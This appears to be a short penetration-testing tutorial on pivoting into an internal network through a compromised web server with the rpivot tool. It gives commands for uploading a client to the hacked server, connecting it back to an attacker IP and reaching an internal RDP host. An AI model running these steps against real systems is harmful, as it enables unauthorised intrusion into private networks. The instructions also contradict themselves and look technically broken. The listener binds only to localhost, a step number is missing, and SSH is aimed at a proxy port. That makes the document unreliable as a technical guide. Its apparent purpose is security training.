## What Is `rpivot`?

**`rpivot`** is a tool that helps you **pivot through a compromised web server**.

> Think of it like this:  
> 🎯 You’ve compromised a web server, but you want to explore the **internal network behind it**.  
> ❌ You _can’t_ SSH into the web server.  
> ✅ But you _can_ upload and run a Python script (like a webshell or reverse shell).

That’s where **`rpivot`** helps.
It sets up a **tunnel** between:
- Your **attacker machine**
- The **internal network**, going **through** the web server you control
___
##  How Does It Work?

1. You run the `rpivot` **client** on the web server (that you control).
2. You run the `rpivot` **server** on your attack machine.
3. It sets up a **tunnel** between the two.
4. You can now use tools (like Nmap, RDP, FTP, etc.) on **internal hosts** as if they’re on your own network.

### Step 1: Start `rpivot` Server (on your Kali or Pwnbox)
```bash
python3 rpivot-server.py -l 127.0.0.1 -p 9001
```
This will:

    Start listening on 127.0.0.1:9001
    Wait for the connection from the web server
### Step2: Upload and Start `rpivot` Client (on the web server)
just transfer using a webshell, wget, curl, etc.
```bash
python3 rpivot-client.py -s <YOUR_ATTACK_IP> -p 9001
```
Replace `<YOUR_ATTACK_IP>` with your real IP (e.g., 10.10.14.25).
This command:
- Connects the compromised server **back** to your listener
- Creates a tunnel

### ### Step 4: Forward Local Ports to Internal Targets

Let’s say you want to access `172.16.5.19:3389` (RDP) through the tunnel.

On your own box:
```bash
ssh -L 13389:172.16.5.19:3389 127.0.0.1 -p 9001
```
Then open:
```bash
rdesktop 127.0.0.1:13389
```
